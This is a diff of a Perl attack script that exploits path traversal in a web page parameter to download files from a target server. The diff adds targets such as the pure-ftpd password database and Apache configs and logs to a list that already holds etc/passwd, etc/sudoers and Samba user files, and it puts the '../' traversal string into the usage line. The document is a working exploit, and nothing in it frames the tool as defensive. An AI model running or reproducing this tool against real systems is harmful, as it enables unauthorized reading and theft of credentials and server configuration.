@@ -40,6 +40,7 @@ system("mkdir $site");
 "etc/pam_smb.conf", 
 "etc/profile", 
 "etc/proftpd.conf", 
+"etc/pure-ftpd/pureftpd.pdb",
 "etc/rc.local", 
 "etc/resolv.conf", 
 "etc/rndc.conf", 
@@ -49,6 +50,8 @@ system("mkdir $site");
 "etc/sudoers", 
 "etc/syslog.conf", 
 "etc/httpd/conf.d/squid.conf", 
+"etc/httpd/conf/httpd.conf",
+"etc/apache2/httpd2.conf",
 "etc/openldap/ldap.conf", 
 "etc/samba/smb.conf", 
 "etc/samba/smbusers", 
@@ -78,12 +81,28 @@ system("mkdir $site");
 "var/log/messages", 
 "var/log/mysqld.log", 
 "var/log/proftpd.log", 
-"var/log/secure", 
+"var/log/secure",
+"var/log/apache2/error.log",
+"var/log/apache2/access.log",
+"var/log/apache2/error_log",
+"var/log/apache2/access_log",
+"var/log/httpd/error_log",
+"var/log/httpd/access_log",
 "var/log/lastlog",
+"var/log/httpd-error.log",
+"var/log/httpd-access.log",
+"var/apache2/logs/error_log",
+"var/apache2/logs/access_log",
+"var/www/conf/httpd.conf",
+"var/www/logs/error_log",
+"var/www/logs/access_log",
 "usr/local/apache2/conf/httpd.conf",
+"usr/pkg/etc/httpd/httpd.conf",
+"usr/local/etc/apache22/httpd.conf",
+"usr/local/etc/apache2/httpd.conf",
 "etc/httpd/httpd.conf");
 
-$res = $h->GET('http://' . $site . $page . '../../../../../../../../../../../../../../../../../../../../../etc/passwd');
+$res = $h->GET('http://' . $site . $page . 'etc/passwd');
 
 $mat = substr($res, 0, index($res, 'root:x:0:0:root'));
 $mat1 = length($mat);
@@ -96,19 +115,21 @@ while($res =~ m/\w+:x:\d+:\d+:.+:[\/\w+]+:([\/\w+]+)/g){
 $mat = substr($res, rindex($res, $w) + length($w)+1, length($res));
 $mat2 = length($mat);
 
-$path = '../../../../../../../../../../../../../../../../../../../../../';
 
 foreach my $f (@files){
 	my $content = "";
-	print "/$f\n";
-	$res = $h->GET('http://' . $site . $page . $path . $f);
+	print "/$f ";
+	$res = $h->GET('http://' . $site . $page . $f);
 	$content = &clean($mat1, $mat2, $res);
 	if($content){
 		$f =~s/\//_/g;
 		open(a, ">$site/$f");
 		print a $content;
 		close(a);
-		print "Saved in: $f\n"
+		print "SAVED: $f\n"
+	}
+	else{
+		print "\n";
 	}
 
 }
@@ -117,7 +138,7 @@ foreach my $f (@files){
 
  
 sub usage(){
-	print " use:\n\tperl $0 www.example.com /file.php?var=\n";
+	print " use:\n\tperl $0 www.example.com /file.php?var=../../../../../../\n";
 	exit();
 }
 
